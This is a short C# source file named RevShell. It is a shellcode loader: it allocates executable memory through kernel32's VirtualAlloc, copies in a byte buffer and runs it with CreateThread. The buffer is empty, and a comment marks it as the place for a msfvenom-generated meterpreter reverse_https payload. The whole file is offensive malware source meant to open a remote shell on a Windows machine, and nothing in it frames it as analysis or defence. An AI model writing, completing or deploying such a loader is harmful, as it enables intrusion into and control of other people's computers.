using System;
using System.Runtime.InteropServices;

namespace RevShell
{
    public class Program
    {
        private static uint MEM_COMMIT = 0x1000;
        private static uint PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr param, int dwCreationFlags, ref IntPtr lpThreadId);


        [DllImport("kernel32.dll")]
	    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

	    public static void Main(string[] args)
        {
            var buf = new byte[641] { /* meterpreter payload here msfvenom -p windows/x64/meterpreter/reverse_https ... -f csharp */ };

            IntPtr memArea = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(buf, 0, memArea, buf.Length);
            IntPtr threadId = IntPtr.Zero;
            IntPtr threadHandle = CreateThread(IntPtr.Zero, UIntPtr.Zero, memArea, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(threadHandle, uint.MaxValue);
        }
    }
}
